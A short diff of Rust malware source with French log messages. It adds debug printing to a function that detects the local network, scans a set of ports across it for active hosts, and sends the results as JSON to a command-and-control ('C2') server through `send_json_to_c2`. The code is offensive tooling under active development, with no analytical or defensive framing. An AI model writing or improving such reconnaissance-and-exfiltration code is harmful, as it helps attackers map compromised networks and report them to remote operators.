@@ -98,22 +98,32 @@ async fn scan_port(port: u16, network: IpNetwork) -> ScanResult {
 }
 
 pub async fn scan_all_ports() -> Result<()> {
-    let network = guess_local_network().ok_or_else(|| anyhow!("Aucun réseau local détecté"))?;
+    println!("[NETWORK] Détection du réseau local...");
+    let network = guess_local_network().ok_or_else(|| {
+        println!("[NETWORK] ERREUR: Aucun réseau local détecté");
+        anyhow!("Aucun réseau local détecté")
+    })?;
+    println!("[NETWORK] Réseau trouvé: {}", network);
 
     let mut scan_results = Vec::new();
 
     for &port in PORTS_TO_SCAN {
+        println!("[NETWORK] Scan du port {}...", port);
         let result = scan_port(port, network).await;
+        println!("[NETWORK] Port {} terminé: {} hosts actifs", port, result.active_hosts.len());
         scan_results.push(result);
     }
 
+    println!("[NETWORK] Tous les ports scannés, envoi des résultats...");
     let data = ScanSet {
         scans: scan_results,
     };
 
     let json = json!(&data);
 
+    println!("[NETWORK] Envoi JSON au C2...");
     send_json_to_c2(&json).await?;
+    println!("[NETWORK] Résultats envoyés");
 
     Ok(())
 }
